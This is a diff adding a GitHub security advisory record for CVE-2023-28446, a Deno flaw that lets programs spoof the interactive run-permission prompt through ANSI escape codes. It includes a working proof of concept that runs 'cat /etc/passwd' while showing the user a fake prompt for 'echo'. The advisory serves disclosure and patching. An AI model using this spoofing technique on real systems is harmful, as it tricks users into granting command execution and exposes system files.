@@ -1,0 +1,88 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-vq67-rp93-65qf",
+  "modified": "2023-03-24T22:06:01Z",
+  "published": "2023-03-24T22:06:01Z",
+  "aliases": [
+    "CVE-2023-28446"
+  ],
+  "summary": "Interactive `run` permission prompt spoofing via improper ANSI neutralization",
+  "details": "### Summary\nArbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a `op_spawn_child` or `op_kill` prompt and replace it with any desired text.\n\n### Details\n\nThe main entry point comes down to the ability to override what the API control says ([40_process.js](https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175)). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in `op_kill`.\n\n### PoC\n\nThis PoC works on 1.31.1, but modified versions of it work on older versions.\n\nMake a file, e.g. `index.ts`, that uses this vulnerability to spoof the `op_spawn_child` permission prompt\n\n```ts\nconst boldANSI = \"\\u001b[1m\" // bold\nconst unboldANSI = \"\\u001b[22m\" // unbold\n\nconst prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to \"echo\"${unboldANSI}\n├ Requested by \\`Deno.Command().output()`\n\nconst moveANSIUp = \"\\u001b[1A\" // moves to the start of the line\nconst clearANSI = \"\\u001b[2K\" // clears the line\nconst moveANSIStart = \"\\u001b[1000D\" // moves to the start of the line\n\nDeno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({\n    cmd: \"cat\",\n    args: [\"/etc/passwd\"],\n    clearEnv: false,\n    env: [],\n    stdin: \"null\",\n    stdout: \"inherit\",\n    stderr: \"piped\"\n}, moveANSIUp + clearANSI + moveANSIStart + prompt)\n```\n\nRun the file with `deno run index.ts`.\n\n### Impact\nAny Deno program is able to spoof the interactive permission prompt for the `op_spawn_child` or the `op_kill` action (which indirectly gives access to all run commands) by overriding the `Requested by {message} API` with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:\n\n```\n// Expected Prompt\n┌ ⚠️  Deno requests run access to \"cat\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >\n\n// Actual Prompt\n┌ ⚠️  Deno requests run access to \"echo\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >\n```\n\nThis works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.\n\nThis problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).\n\nBefore `v1.31.0`, this requires the `--unstable` flag. \n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "deno_runtime"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.8.0"
+            },
+            {
+              "fixed": "1.31.2"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "deno"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.8.0"
+            },
+            {
+              "fixed": "1.31.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28446"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/denoland/deno"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/denoland/deno/releases/tag/v1.31.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-150"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-24T22:06:01Z",
+    "nvd_published_at": "2023-03-24T20:15:00Z"
+  }
+}
